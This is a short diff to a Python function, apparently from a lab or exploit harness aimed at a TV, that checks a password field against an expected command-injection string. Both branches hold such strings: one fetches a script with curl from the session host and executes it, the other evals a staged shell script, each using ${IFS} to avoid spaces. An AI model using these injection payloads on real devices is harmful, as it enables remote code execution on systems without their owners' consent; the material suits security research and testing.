@@ -48,9 +48,16 @@ def prepared_password(lab: Path) -> str:
                 or owner.get("user") != "danstvprobe" or owner.get("share") != "DansTVProbe"
                 or not re.fullmatch(r"[0-9a-f]{24}", token)):
             raise ValueError("Unexpected snapshot session")
-        tmp = "/tmp/dtv" + token[:6]
-        expected = ('$(/usr/bin/curl${IFS}-fsS${IFS}http://' + session["host"] +
-                    ':8181/d/' + token + '>' + tmp + '&&.${IFS}' + tmp + ')')
+        if session.get("mode") == "Staged":
+            remote = session.get("stage_remote", "")
+            if not re.fullmatch(r"/home/owner/share/tmp/sdk_tools/dtvs[0-9a-f]{8}\.sh", remote) or \
+                    not remote.endswith("dtvs" + token[:8] + ".sh"):
+                raise ValueError("Invalid staged TV path")
+            expected = '$(eval${IFS}$(cat${IFS}' + remote + '))'
+        else:
+            tmp = "/tmp/dtv" + token[:6]
+            expected = ('$(/usr/bin/curl${IFS}-fsS${IFS}http://' + session["host"] +
+                        ':8181/d/' + token + '>' + tmp + '&&.${IFS}' + tmp + ')')
         if secret != expected:
             raise ValueError("Current password does not match the snapshot session")
     return secret
